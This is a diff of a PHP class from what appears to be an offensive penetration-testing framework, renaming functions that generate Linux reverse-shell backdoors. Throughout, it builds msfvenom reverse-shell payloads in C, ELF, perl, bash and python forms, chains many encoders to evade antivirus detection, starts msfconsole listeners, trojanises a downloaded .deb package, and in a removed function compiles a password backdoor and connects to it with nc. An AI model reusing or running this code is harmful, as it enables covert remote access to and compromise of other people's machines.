@@ -14,17 +14,17 @@ class com4malw extends com4obj {
     
     
     
-    function backdoor_linux_c4rev8msf_x86() {
+    function rev8msf_c_x86($attacker_ip,$attacker_port,$shell){
         $this->ssTitre(__FUNCTION__);
         return  $this->req_ret_str("msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform linux --encoder x86/shikata_ga_nai --iterations 1 --format c  ");
     }
     
-    function backdoor_linux_elf4rev8msf_x86() {
+    function rev8msf_elf_x86($attacker_ip,$attacker_port,$shell){
         $this->ssTitre(__FUNCTION__);
         return  $this->req_ret_str("msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform linux --encoder x86/shikata_ga_nai --iterations 1 --format elf  ");
     }
     
-    function backdoor_linux_msf2c2rev() {
+    function rev8msf_shell($attacker_ip,$attacker_port,$shell){
         $this->ssTitre("SHELLCODE C");
         
         
@@ -51,38 +51,25 @@ class com4malw extends com4obj {
         $this->pause();
     }
     
-    
-    public function backdoor_linux_c2passwd(){
-        $this->ssTitre(__FUNCTION__);
-        $this->requette("cp -v $this->dir_c/backdoor_with_password.c $this->file_dir/$this->file_name.c");
-        $file_c = new FILE("$this->file_dir/$this->file_name.c");
-        $file_elf = $file_c->file_c2elf("-m32");
-        $this->file_file2virus2vt();
-        $this->elf2info();
-        $this->pause();
-        $cmd1 = "$this->file_path /bin/sh $this->attacker_port rohff ";
-        $cmd2 = "nc $this->attacker_ip $this->attacker_port -v -n";
-        $this->exec_parallel($cmd1, $cmd2, 2);
-        $this->pause();
-    }
+ 
     
     
     
     
-    public function backdoor_linux_perl4rev8msf() {
+    public function rev8msf_perl($attacker_ip,$attacker_port,$shell){
         $this->ssTitre(__FUNCTION__);
         $query = "msfvenom -p cmd/unix/reverse_perl LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform unix --encoder  x86/shikata_ga_nai  --iterations 10 --format raw ";
         return $this->req_ret_str($query);
     }
     
-    public function backdoor_linux_bash4rev8msf() {
+    public function rev8msf_bash($attacker_ip,$attacker_port,$shell){
         $this->ssTitre(__FUNCTION__);
         $this->rouge("This will not work on most Debian-based Linux distributions (including Ubuntu) because they compile bash without the /dev/tcp feature.");
         $query = "msfvenom -p cmd/unix/reverse_bash LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform unix --encoder  x86/shikata_ga_nai  --iterations 10 --format bash ";
         return $this->req_ret_str($query);
     }
     
-    public function backdoor_linux_python4rev8simple($shell) {
+    public function rev8python_simple($attacker_ip,$attacker_port,$shell){
         $this->ssTitre(__FUNCTION__);
         
         $code =<<<CODE
@@ -98,13 +85,13 @@ CODE;
         return $code ;
     }
     
-    public function backdoor_linux_python4rev8msf() {
+    public function rev8msf_python($attacker_ip,$attacker_port,$shell){
         $this->ssTitre(__FUNCTION__);
         $query = "msfvenom -p cmd/unix/reverse_python LHOST=$this->attacker_ip LPORT=$this->attacker_port --format raw ";
         return $this->req_ret_str($query);
     }
     
-    public function backdoor_linux_elf4rev8msf_encoded_10() {
+    public function rev8msf_encoded_10($attacker_ip,$attacker_port,$shell){
         $this->ssTitre(__FUNCTION__);
         $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set payload linux/x86/shell_reverse_tcp;set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
         $query = "msfvenom --payload  linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --platform linux --arch x86 --encoder  x86/shikata_ga_nai  --iterations 10 --format elf ";
@@ -113,7 +100,7 @@ CODE;
     
     
     
-    public function backdoor_linux_elf4rev8msf_encoded_multi() {
+    public function rev8msf_encoded_multi($attacker_ip,$attacker_port,$shell){
         $this->ssTitre(__FUNCTION__);
         $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set payload linux/x86/shell_reverse_tcp;set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
         $query = "msfvenom --payload linux/x86/shell_reverse_tcp LHOST=$this->attacker_ip LPORT=$this->attacker_port --arch x86 --platform linux --encoder x86/shikata_ga_nai --iterations 10 --format raw | msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform linux --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform linux --format raw | msfvenom  -a x86 -e x86/shikata_ga_nai --iterations 10  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform linux --format raw | msfvenom -a x86 -e x86/alpha_mixed BufferRegister=EAX  --platform linux --format raw |  msfvenom -a x86 -e x86/jmp_call_additive --iterations 3  --platform linux --format raw | msfvenom -a x86 -e x86/countdown --iterations 5  --platform linux --format raw | msfvenom -a x86 -e x86/call4_dword_xor --iterations 2  --platform linux --format raw | msfvenom -a x86 -e x86/shikata_ga_nai --iterations 10  --platform linux --format elf ";
@@ -123,7 +110,7 @@ CODE;
     }
     
     
-    public function backdoor_linux_elf4rev8msf_simple() {
+    public function rev8msf_simple($attacker_ip,$attacker_port,$shell){
         $this->ssTitre(__FUNCTION__);
         $this->ssTitre("Creation de backdoor TCP avec MSF MODE Reverse pour cible Linux" );
         $this->cmd("localhost","msfconsole -q -x \"use exploit/multi/handler;set payload linux/x86/shell_reverse_tcp;set LHOST $this->attacker_ip;set LPORT $this->attacker_port;run;\" ");
@@ -132,7 +119,7 @@ CODE;
     }
     
     
-    public function backdoor_linux_fake_deb() {
+    public function backdoor_linux_fake_deb($attacker_ip,$attacker_port,$shell){
         $this->ssTitre(__FUNCTION__);
         $this->ssTitre(".deb file" );
         $this->requette("echo '$this->root_passwd' | sudo -S apt-get download freesweep" );
@@ -269,11 +256,6 @@ sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores & /us
                     $this->article("OPT GCC",$option_compile);
                     $data = "gcc -ggdb -w $options_compiler /tmp/$obj_file->file_name$obj_file->file_ext -o /tmp/$obj_file->file_name.elf && chmod +x /tmp/$obj_file->file_name.elf"; //
                     $this->req_str($stream,$data,10);
-                    
-                    $data = "ls -al /tmp/$obj_file->file_name.elf"; //
-                    $this->lan2stream4result($data,$this->stream_timeout);
-                    $data = "file /tmp/$obj_file->file_name.elf "; //
-                    $this->lan2stream4result($data,$this->stream_timeout);
                     return "/tmp/$obj_file->file_name.elf" ;
                     
                 case ($obj_file->file_ext==".py") :
